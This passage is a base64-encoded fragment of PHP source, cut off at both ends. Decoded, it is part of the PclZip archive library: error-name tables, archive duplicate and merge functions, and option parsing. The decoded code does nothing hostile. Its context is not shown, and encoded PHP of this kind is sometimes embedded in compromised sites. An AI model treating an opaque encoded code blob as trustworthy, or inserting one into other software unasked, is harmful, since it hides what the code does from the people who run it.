9ICdwY2x6aXAnKSkNCiAgew0KDQogICAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZEdXBsaWNhdGUoJHBfYXJjaGl2ZS0+emlwbmFtZSk7DQogIH0NCg0KICBlbHNlIGlmIChpc19zdHJpbmcoJHBfYXJjaGl2ZSkpDQogIHsNCg0KICAgIGlmICghaXNfZmlsZSgkcF9hcmNoaXZlKSkgew0KICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9NSVNTSU5HX0ZJTEUsICJObyBmaWxlIHdpdGggZmlsZW5hbWUgJyIuJHBfYXJjaGl2ZS4iJyIpOw0KICAgICAgJHZfcmVzdWx0ID0gUENMWklQX0VSUl9NSVNTSU5HX0ZJTEU7DQogICAgfQ0KICAgIGVsc2Ugew0KICAgICAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZEdXBsaWNhdGUoJHBfYXJjaGl2ZSk7DQogICAgfQ0KICB9DQoNCiAgZWxzZQ0KICB7DQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUiwgIkludmFsaWQgdmFyaWFibGUgdHlwZSBwX2FyY2hpdmVfdG9fYWRkIik7DQogICAgJHZfcmVzdWx0ID0gUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUjsNCiAgfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIG1lcmdlKCRwX2FyY2hpdmVfdG9fYWRkKQ0Kew0KICAkdl9yZXN1bHQgPSAxOw0KDQogICR0aGlzLT5wcml2RXJyb3JSZXNldCgpOw0KDQogIGlmICghJHRoaXMtPnByaXZDaGVja0Zvcm1hdCgpKSB7DQogICAgcmV0dXJuKDApOw0KICB9DQoNCiAgaWYgKChpc19vYmplY3QoJHBfYXJjaGl2ZV90b19hZGQpKSAmJiAoZ2V0X2NsYXNzKCRwX2FyY2hpdmVfdG9fYWRkKSA9PSAncGNsemlwJykpDQogIHsNCg0KICAgICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2TWVyZ2UoJHBfYXJjaGl2ZV90b19hZGQpOw0KICB9DQoNCiAgZWxzZSBpZiAoaXNfc3RyaW5nKCRwX2FyY2hpdmVfdG9fYWRkKSkNCiAgew0KDQogICAgJHZfb2JqZWN0X2FyY2hpdmUgPSBuZXcgUGNsWmlwKCRwX2FyY2hpdmVfdG9fYWRkKTsNCg0KICAgICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2TWVyZ2UoJHZfb2JqZWN0X2FyY2hpdmUpOw0KICB9DQoNCiAgZWxzZQ0KICB7DQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUiwgIkludmFsaWQgdmFyaWFibGUgdHlwZSBwX2FyY2hpdmVfdG9fYWRkIik7DQogICAgJHZfcmVzdWx0ID0gUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUjsNCiAgfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCg0KDQpmdW5jdGlvbiBlcnJvckNvZGUoKQ0Kew0KICBpZiAoUENMWklQX0VSUk9SX0VYVEVSTkFMID09IDEpIHsNCiAgICByZXR1cm4oUGNsRXJyb3JDb2RlKCkpOw0KICB9DQogIGVsc2Ugew0KICAgIHJldHVybigkdGhpcy0+ZXJyb3JfY29kZSk7DQogIH0NCn0NCg0KZnVuY3Rpb24gZXJyb3JOYW1lKCRwX3dpdGhfY29kZT1mYWxzZSkNCnsNCiAgJHZfbmFtZSA9IGFycmF5ICggUENMWklQX0VSUl9OT19FUlJPUiA9PiAnUENMWklQX0VSUl9OT19FUlJPUicsDQogICAgICAgICAgICAgICAgICAgIFBDTFpJUF9FUlJfV1JJVEVfT1BFTl9GQUlMID0+ICdQQ0xaSVBfRVJSX1dSSVRFX09QRU5fRkFJTCcsDQogICAgICAgICAgICAgICAgICAgIFBDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwgPT4gJ1BDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwnLA0KICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSID0+ICdQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSJywNCiAgICAgICAgICAgICAgICAgICAgUENMWklQX0VSUl9NSVNTSU5HX0ZJTEUgPT4gJ1BDTFpJUF9FUlJfTUlTU0lOR19GSUxFJywNCiAgICAgICAgICAgICAgICAgICAgUENMWklQX0VSUl9GSUxFTkFNRV9UT09fTE9ORyA9PiAnUENMWklQX0VSUl9GSUxFTkFNRV9UT09fTE9ORycsDQogICAgICAgICAgICAgICAgICAgIFBDTFpJUF9FUlJfSU5WQUxJRF9aSVAgPT4gJ1BDTFpJUF9FUlJfSU5WQUxJRF9aSVAnLA0KICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfRVJSX0JBRF9FWFRSQUNURURfRklMRSA9PiAnUENMWklQX0VSUl9CQURfRVhUUkFDVEVEX0ZJTEUnLA0KICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfRVJSX0RJUl9DUkVBVEVfRkFJTCA9PiAnUENMWklQX0VSUl9ESVJfQ1JFQVRFX0ZBSUwnLA0KICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfRVJSX0JBRF9FWFRFTlNJT04gPT4gJ1BDTFpJUF9FUlJfQkFEX0VYVEVOU0lPTicsDQogICAgICAgICAgICAgICAgICAgIFBDTFpJUF9FUlJfQkFEX0ZPUk1BVCA9PiAnUENMWklQX0VSUl9CQURfRk9STUFUJywNCiAgICAgICAgICAgICAgICAgICAgUENMWklQX0VSUl9ERUxFVEVfRklMRV9GQUlMID0+ICdQQ0xaSVBfRVJSX0RFTEVURV9GSUxFX0ZBSUwnLA0KICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfRVJSX1JFTkFNRV9GSUxFX0ZBSUwgPT4gJ1BDTFpJUF9FUlJfUkVOQU1FX0ZJTEVfRkFJTCcsDQogICAgICAgICAgICAgICAgICAgIFBDTFpJUF9FUlJfQkFEX0NIRUNLU1VNID0+ICdQQ0xaSVBfRVJSX0JBRF9DSEVDS1NVTScsDQogICAgICAgICAgICAgICAgICAgIFBDTFpJUF9FUlJfSU5WQUxJRF9BUkNISVZFX1pJUCA9PiAnUENMWklQX0VSUl9JTlZBTElEX0FSQ0hJVkVfWklQJywNCiAgICAgICAgICAgICAgICAgICAgUENMWklQX0VSUl9NSVNTSU5HX09QVElPTl9WQUxVRSA9PiAnUENMWklQX0VSUl9NSVNTSU5HX09QVElPTl9WQUxVRScsDQogICAgICAgICAgICAgICAgICAgIFBDTFpJUF9FUlJfSU5WQUxJRF9PUFRJT05fVkFMVUUgPT4gJ1BDTFpJUF9FUlJfSU5WQUxJRF9PUFRJT05fVkFMVUUnLA0KICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfRVJSX1VOU1VQUE9SVEVEX0NPTVBSRVNTSU9OID0+ICdQQ0xaSVBfRVJSX1VOU1VQUE9SVEVEX0NPTVBSRVNTSU9OJywNCiAgICAgICAgICAgICAgICAgICAgUENMWklQX0VSUl9VTlNVUFBPUlRFRF9FTkNSWVBUSU9OID0+ICdQQ0xaSVBfRVJSX1VOU1VQUE9SVEVEX0VOQ1JZUFRJT04nDQogICAgICAgICAgICAgICAgICAgICxQQ0xaSVBfRVJSX0lOVkFMSURfQVRUUklCVVRFX1ZBTFVFID0+ICdQQ0xaSVBfRVJSX0lOVkFMSURfQVRUUklCVVRFX1ZBTFVFJw0KICAgICAgICAgICAgICAgICAgICAsUENMWklQX0VSUl9ESVJFQ1RPUllfUkVTVFJJQ1RJT04gPT4gJ1BDTFpJUF9FUlJfRElSRUNUT1JZX1JFU1RSSUNUSU9OJw0KICAgICAgICAgICAgICAgICAgKTsNCg0KICBpZiAoaXNzZXQoJHZfbmFtZVskdGhpcy0+ZXJyb3JfY29kZV0pKSB7DQogICAgJHZfdmFsdWUgPSAkdl9uYW1lWyR0aGlzLT5lcnJvcl9jb2RlXTsNCiAgfQ0KICBlbHNlIHsNCiAgICAkdl92YWx1ZSA9ICdOb05hbWUnOw0KICB9DQoNCiAgaWYgKCRwX3dpdGhfY29kZSkgew0KICAgIHJldHVybigkdl92YWx1ZS4nICgnLiR0aGlzLT5lcnJvcl9jb2RlLicpJyk7DQogIH0NCiAgZWxzZSB7DQogICAgcmV0dXJuKCR2X3ZhbHVlKTsNCiAgfQ0KfQ0KDQpmdW5jdGlvbiBlcnJvckluZm8oJHBfZnVsbD1mYWxzZSkNCnsNCiAgaWYgKFBDTFpJUF9FUlJPUl9FWFRFUk5BTCA9PSAxKSB7DQogICAgcmV0dXJuKFBjbEVycm9yU3RyaW5nKCkpOw0KICB9DQogIGVsc2Ugew0KICAgIGlmICgkcF9mdWxsKSB7DQogICAgICByZXR1cm4oJHRoaXMtPmVycm9yTmFtZSh0cnVlKS4iIDogIi4kdGhpcy0+ZXJyb3Jfc3RyaW5nKTsNCiAgICB9DQogICAgZWxzZSB7DQogICAgICByZXR1cm4oJHRoaXMtPmVycm9yX3N0cmluZy4iIFtjb2RlICIuJHRoaXMtPmVycm9yX2NvZGUuIl0iKTsNCiAgICB9DQogIH0NCn0NCg0KDQoNCg0KDQpmdW5jdGlvbiBwcml2Q2hlY2tGb3JtYXQoJHBfbGV2ZWw9MCkNCnsNCiAgJHZfcmVzdWx0ID0gdHJ1ZTsNCg0KICBjbGVhcnN0YXRjYWNoZSgpOw0KDQogICR0aGlzLT5wcml2RXJyb3JSZXNldCgpOw0KDQogIGlmICghaXNfZmlsZSgkdGhpcy0+emlwbmFtZSkpIHsNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX01JU1NJTkdfRklMRSwgIk1pc3NpbmcgYXJjaGl2ZSBmaWxlICciLiR0aGlzLT56aXBuYW1lLiInIik7DQogICAgcmV0dXJuKGZhbHNlKTsNCiAgfQ0KDQogIGlmICghaXNfcmVhZGFibGUoJHRoaXMtPnppcG5hbWUpKSB7DQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9SRUFEX09QRU5fRkFJTCwgIlVuYWJsZSB0byByZWFkIGFyY2hpdmUgJyIuJHRoaXMtPnppcG5hbWUuIiciKTsNCiAgICByZXR1cm4oZmFsc2UpOw0KICB9DQoNCg0KDQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdlBhcnNlT3B0aW9ucygmJHBfb3B0aW9uc19saXN0LCAkcF9zaXplLCAmJHZfcmVzdWx0X2xpc3QsICR2X3JlcXVlc3RlZF9vcHRpb25zPWZhbHNlKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCiAgDQogICRpPTA7DQogIHdoaWxlICgkaTwkcF9zaXplKSB7DQoNCiAgICBpZiAoIWlzc2V0KCR2X3JlcXVlc3RlZF9vcHRpb25zWyRwX29wdGlvbnNfbGlzdFskaV1dKSkgew0KICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUiwgIkludmFsaWQgb3B0aW9uYWwgcGFyYW1ldGVyICciLiRwX29wdGlvbnNfbGlzdFskaV0uIicgZm9yIHRoaXMgbWV0aG9kIik7DQoNCiAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgIH0NCg0KICAgIHN3aXRjaCAoJHBfb3B0aW9uc19saXN0WyRpXSkgew0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX1BBVEggOg0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX1JFTU9WRV9QQVRIIDoNCiAgICAgIGNhc2UgUENMWklQX09QVF9BRERfUEFUSCA6DQogICAgICAgIGlmICgoJGkrMSkgPj0gJHBfc2l6ZSkgew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfTUlTU0lOR19PUFRJT05fVkFMVUUsICJNaXNzaW5nIHBhcmFtZXRlciB2YWx1ZSBmb3Igb3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIik7DQoNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgICR2X3Jlc3VsdF9saXN0WyRwX29wdGlvbnNfbGlzdFskaV1dID0gUGNsWmlwVXRpbFRyYW5zbGF0ZVdpblBhdGgoJHBfb3B0aW9uc19saXN0WyRpKzFdLCBGQUxTRSk7DQogICAgICAgICRpKys7DQogICAgICBicmVhazsNCg0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX1RFTVBfRklMRV9USFJFU0hPTEQgOg0KICAgICAgICBpZiAoKCRpKzEpID49ICRwX3NpemUpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX01JU1NJTkdfT1BUSU9OX1ZBTFVFLCAiTWlzc2luZyBwYXJhbWV0ZXIgdmFsdWUgZm9yIG9wdGlvbiAnIi5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkcF9vcHRpb25zX2xpc3RbJGldKS4iJyIpOw0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBpZiAoaXNzZXQoJHZfcmVzdWx0X2xpc3RbUENMWklQX09QVF9URU1QX0ZJTEVfT0ZGXSkpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSLCAiT3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIGNhbiBub3QgYmUgdXNlZCB3aXRoIG9wdGlvbiAnUENMWklQX09QVF9URU1QX0ZJTEVfT0ZGJyIpOw0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICAkdl92YWx1ZSA9ICRwX29wdGlvbnNfbGlzdFskaSsxXTsNCiAgICAgICAgaWYgKCghaXNfaW50ZWdlcigkdl92YWx1ZSkpIHx8ICgkdl92YWx1ZTwwKSkgew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9PUFRJT05fVkFMVUUsICJJbnRlZ2VyIGV4cGVjdGVkIGZvciBvcHRpb24gJyIuUGNsWmlwVXRpbE9wdGlvblRleHQoJHBfb3B0aW9uc19saXN0WyRpXSkuIiciKTsNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgICR2X3Jlc3VsdF9saXN0WyRwX29wdGlvbnNfbGlzdFskaV1dID0gJHZfdmFsdWUqMTA0ODU3NjsNCiAgICAgICAgJGkrKzsNCiAgICAgIGJyZWFrOw0KDQogICAgICBjYXNlIFBDTFpJUF9PUFRfVEVNUF9GSUxFX09OIDoNCiAgICAgICAgaWYgKGlzc2V0KCR2X3Jlc3VsdF9saXN0W1BDTFpJUF9PUFRfVEVNUF9GSUxFX09GRl0pKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUiwgIk9wdGlvbiAnIi5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkcF9vcHRpb25zX2xpc3RbJGldKS4iJyBjYW4gbm90IGJlIHVzZWQgd2l0aCBvcHRpb24gJ1BDTFpJUF9PUFRfVEVNUF9GSUxFX09GRiciKTsNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW9uc19saXN0WyRpXV0gPSB0cnVlOw0KICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgUENMWklQX09QVF9URU1QX0ZJTEVfT0ZGIDoNCiAgICAgICAgaWYgKGlzc2V0KCR2X3Jlc3VsdF9saXN0W1BDTFpJUF9PUFRfVEVNUF9GSUxFX09OXSkpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSLCAiT3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIGNhbiBub3QgYmUgdXNlZCB3aXRoIG9wdGlvbiAnUENMWklQX09QVF9URU1QX0ZJTEVfT04nIik7DQogICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGlzc2V0KCR2X3Jlc3VsdF9saXN0W1BDTFpJUF9PUFRfVEVNUF9GSUxFX1RIUkVTSE9MRF0pKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUiwgIk9wdGlvbiAnIi5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkcF9vcHRpb25zX2xpc3RbJGldKS4iJyBjYW4gbm90IGJlIHVzZWQgd2l0aCBvcHRpb24gJ1BDTFpJUF9PUFRfVEVNUF9GSUxFX1RIUkVTSE9MRCciKTsNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW9uc19saXN0WyRpXV0gPSB0cnVlOw0KICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgUENMWklQX09QVF9FWFRSQUNUX0RJUl9SRVNUUklDVElPTiA6DQogICAgICAgIGlmICgoJGkrMSkgPj0gJHBfc2l6ZSkgew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfTUlTU0lOR19PUFRJT05fVkFMVUUsICJNaXNzaW5nIHBhcmFtZXRlciB2YWx1ZSBmb3Igb3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIik7DQoNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmICggICBpc19zdHJpbmcoJHBfb3B0aW9uc19saXN0WyRpKzFdKQ0KICAgICAgICAgICAgJiYgKCRwX29wdGlvbnNfbGlzdFskaSsxXSAhPSAnJykpIHsNCiAgICAgICAgICAkdl9yZXN1bHRfbGlzdFskcF9vcHRpb25zX2xpc3RbJGldXSA9IFBjbFppcFV0aWxUcmFuc2xhdGVXaW5QYXRoKCRwX29wdGlvbnNfbGlzdFskaSsxXSwgRkFMU0UpOw0KICAgICAgICAgICRpKys7DQogICAgICAgIH0NCiAgICAgICAgZWxzZSB7DQogICAgICAgIH0NCiAgICAgIGJyZWFrOw0KDQogICAgICBjYXNlIFBDTFpJUF9PUFRfQllfTkFNRSA6DQogICAgICAgIGlmICgoJGkrMSkgPj0gJHBfc2l6ZSkgew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfTUlTU0lOR19PUFRJT05fVkFMVUUsICJNaXNzaW5nIHBhcmFtZXRlciB2YWx1ZSBmb3Igb3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIik7DQoNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmIChpc19zdHJpbmcoJHBfb3B0aW9uc19saXN0WyRpKzFdKSkgew0KICAgICAgICAgICAgJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW9uc19saXN0WyRpXV1bMF0gPSAkcF9vcHRpb25zX2xpc3RbJGkrMV07DQogICAgICAgIH0NCiAgICAgICAgZWxzZSBpZiAoaXNfYXJyYXkoJHBfb3B0aW9uc19saXN0WyRpKzFdKSkgew0KICAgICAgICAgICAgJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW9uc19saXN0WyRpXV0gPSAkcF9vcHRpb25zX2xpc3RbJGkrMV07DQogICAgICAgIH0NCiAgICAgICAgZWxzZSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX09QVElPTl9WQUxVRSwgIldyb25nIHBhcmFtZXRlciB2YWx1ZSBmb3Igb3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIik7DQoNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KICAgICAgICAkaSsrOw0KICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgUENMWklQX09QVF9CWV9FUkVHIDoNCiAgICAgICAgJHBfb3B0aW9uc19saXN0WyRpXSA9IFBDTFpJUF9PUFRfQllfUFJFRzsNCiAgICAgIGNhc2UgUENMWklQX09QVF9CWV9QUkVHIDoNCiAgICAgICAgaWYgKCgkaSsxKSA+PSAkcF9zaXplKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9NSVNTSU5HX09QVElPTl9WQUxVRSwgIk1pc3NpbmcgcGFyYW1ldGVyIHZhbHVlIGZvciBvcHRpb24gJyIuUGNsWmlwVXRpbE9wdGlvblRleHQoJHBfb3B0aW9uc19saXN0WyRpXSkuIiciKTsNCg0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKGlzX3N0cmluZygkcF9vcHRpb25zX2xpc3RbJGkrMV0pKSB7DQogICAgICAgICAgICAkdl9yZXN1bHRfbGlzdFskcF9vcHRpb25zX2xpc3RbJGldXSA9ICRwX29wdGlvbnNfbGlzdFskaSsxXTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfT1BUSU9OX1ZBTFVFLCAiV3JvbmcgcGFyYW1ldGVyIHZhbHVlIGZvciBvcHRpb24gJyIuUGNsWmlwVXRpbE9wdGlvblRleHQoJHBfb3B0aW9uc19saXN0WyRpXSkuIiciKTsNCg0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQogICAgICAgICRpKys7DQogICAgICBicmVhazsNCg0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX0NPTU1FTlQgOg0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX0FERF9DT01NRU5UIDoNCiAgICAgIGNhc2UgUENMWklQX09QVF9QUkVQRU5EX0NPTU1FTlQgOg0KICAgICAgICBpZiAoKCRpKzEpID49ICRwX3NpemUpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX01JU1NJTkdfT1BUSU9OX1ZBTFVFLA0KCQkgICAgICAgICAgICAgICAgICAgICAiTWlzc2luZyBwYXJhbWV0ZXIgdmFsdWUgZm9yIG9wdGlvbiAnIg0KCQkJCQkJCSAuUGNsWmlwVXRpbE9wdGlvblRleHQoJHBfb3B0aW9uc19saXN0WyRpXSkNCgkJCQkJCQkgLiInIik7DQoNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmIChpc19zdHJpbmcoJHBfb3B0aW9uc19saXN0WyRpKzFdKSkgew0KICAgICAgICAgICAgJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW9uc19saXN0WyRpXV0gPSAkcF9vcHRpb25zX2xpc3RbJGkrMV07DQogICAgICAgIH0NCiAgICAgICAgZWxzZSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX09QVElPTl9WQUxVRSwNCgkJICAgICAgICAgICAgICAgICAgICAgIldyb25nIHBhcmFtZXRlciB2YWx1ZSBmb3Igb3B0aW9uICciDQoJCQkJCQkJIC5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkcF9vcHRpb25zX2xpc3RbJGldKQ0KCQkJCQkJCSAuIiciKTsNCg0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQogICAgICAgICRpKys7DQogICAgICBicmVhazsNCg0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX0JZX0lOREVYIDoNCiAgICAgICAgaWYgKCgkaSsxKSA+PSAkcF9zaXplKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9NSVNTSU5HX09QVElPTl9WQUxVRSwgIk1pc3NpbmcgcGFyYW1ldGVyIHZhbHVlIGZvciBvcHRpb24gJyIuUGNsWmlwVXRpbE9wdGlvblRleHQoJHBfb3B0aW9uc19saXN0WyRpXSkuIiciKTsNCg0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQoNCiAgICAgICAgJHZfd29ya19saXN0ID0gYXJyYXkoKTsNCiAgICAgICAgaWYgKGlzX3N0cmluZygkcF9vcHRpb25zX2xpc3RbJGkrMV0pKSB7DQoNCiAgICAgICAgICAgICRwX29wdGlvbnNfbGlzdFskaSsxXSA9IHN0cnRyKCRwX29wdGlvbnNfbGlzdFskaSsxXSwgJyAnLCAnJyk7DQoNCiAgICAgICAgICAgICR2X3dvcmtfbGlzdCA9IGV4cGxvZGUoIiwiLCAkcF9vcHRpb25zX2xpc3RbJGkrMV0pOw0KICAgICAgICB9DQogICAgICAgIGVsc2UgaWYgKGlzX2ludGVnZXIoJHBfb3B0aW9uc19saXN0WyRpKzFdKSkgew0KICAgICAgICAgICAgJHZfd29ya19saXN0WzBdID0gJHBfb3B0aW9uc19saXN0WyRpKzFdLictJy4kcF9vcHRpb25zX2xpc3RbJGkrMV07DQogICAgICAgIH0NCiAgICAgICAgZWxzZSBpZiAoaXNfYXJyYXkoJHBfb3B0aW9uc19saXN0WyRpKzFdKSkgew0KICAgICAgICAgICAgJHZfd29ya19saXN0ID0gJHBfb3B0aW9uc19saXN0WyRpKzFdOw0KICAgICAgICB9DQogICAgICAgIGVsc2Ugew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9PUFRJT05fVkFMVUUsICJWYWx1ZSBtdXN0IGJlIGludGVnZXIsIHN0cmluZyBvciBhcnJheSBmb3Igb3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIik7DQoNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgJHZfc29ydF9mbGFnPWZhbHNlOw0KICAgICAgICAkdl9zb3J0X3ZhbHVlPTA7DQogICAgICAgIGZvciAoJGo9MDsgJGo8c2l6ZW9mKCR2X3dvcmtfbGlzdCk7ICRqKyspIHsNCiAgICAgICAgICAgICR2X2l0ZW1fbGlzdCA9IGV4cGxvZGUoIi0iLCAkdl93b3JrX2xpc3RbJGpdKTsNCiAgICAgICAgICAgICR2X3NpemVfaXRlbV9saXN0ID0gc2l6ZW9mKCR2X2l0ZW1fbGlzdCk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKCR2X3NpemVfaXRlbV9saXN0ID09IDEpIHsNCiAgICAgICAgICAgICAgICAkdl9yZXN1bHRfbGlzdFskcF9vcHRpb25zX2xpc3RbJGldXVskal1bJ3N0YXJ0J10gPSAkdl9pdGVtX2xpc3RbMF07DQogICAgICAgICAgICAgICAgJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW9uc19saXN0WyRpXV1bJGpdWydlbmQnXSA9ICR2X2l0ZW1fbGlzdFswXTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2VpZiAoJHZfc2l6ZV9pdGVtX2xpc3QgPT0gMikgew0KICAgICAgICAgICAgICAgICR2X3Jlc3VsdF9saXN0WyRwX29wdGlvbnNfbGlzdFskaV1dWyRqXVsnc3RhcnQnXSA9ICR2X2l0ZW1fbGlzdFswXTsNCiAgICAgICAgICAgICAgICAkdl9yZXN1bHRfbGlzdFskcF9vcHRpb25zX2xpc3RbJGldXVskal1bJ2VuZCddID0gJHZfaXRlbV9saXN0WzFdOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZSB7DQogICAgICAgICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX09QVElPTl9WQUxVRSwgIlRvbyBtYW55IHZhbHVlcyBpbiBpbmRleCByYW5nZSBmb3Igb3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIik7DQoNCiAgICAgICAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgICAgIH0NCg0KDQogICAgICAgICAgICBpZiAoJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW